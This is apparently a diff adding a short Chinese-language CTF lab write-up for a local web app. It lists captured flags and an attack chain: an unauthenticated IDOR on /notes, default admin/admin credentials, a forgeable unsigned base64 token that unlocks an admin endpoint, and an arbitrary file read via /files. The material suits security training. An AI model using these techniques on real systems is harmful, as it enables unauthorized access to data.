@@ -1,0 +1,24 @@
+## FLAG 原文
+
+```
+FLAG{idor_user2}
+FLAG{api_chain_ok}
+```
+
+## 攻击链
+
+1. **Recon** — `GET /` 返回端点清单与提示 `token=base64({json uid}) ; notes?id= may not check ownership`（E-002）
+2. **IDOR** — 无任何认证直接 `GET /notes?id=2` → `{"note": "admin-secret-FLAG{idor_user2}", "viewer": null}`；id=0,3-6 均返回 `no note`，证实无 ownership 校验（E-003）
+3. **Token 链** — `POST /login {"user":"admin","pass":"admin"}` → `eyJ1aWQiOiAiMiIsICJ1c2VyIjogImFkbWluIn0=`，base64 解码为 `{"uid":"2","user":"admin"}`（无签名、可伪造）
+   - 无 auth → `403 {"error":"admin only"}`；`X-Token` 头也 403
+   - `Authorization: Bearer <token>` 或 `?token=<token>` → `200 {"flag":"FLAG{api_chain_ok}","debug":true}`（E-004）
+4. **附带发现** — `/files?name=` 为未授权任意文件读（相对 `labs\weblab-api`），但 flag 文件不存在于该目录（E-005）
+
+## 引用 E-id
+
+- **E-002** — recon：`GET /` 端点与提示
+- **E-003** — IDOR：`GET /notes?id=2` 未授权读取 `FLAG{idor_user2}`
+- **E-004** — admin token 链：login → base64 伪造 → `/admin/config` 返回 `FLAG{api_chain_ok}`
+- **E-005** — `/files` 任意读探针（无 flag 存储）
+
+Findings 已 record，全部证据落盘于 `case/evidence/`。所有请求均仅发往 `http://127.0.0.1:18081`。
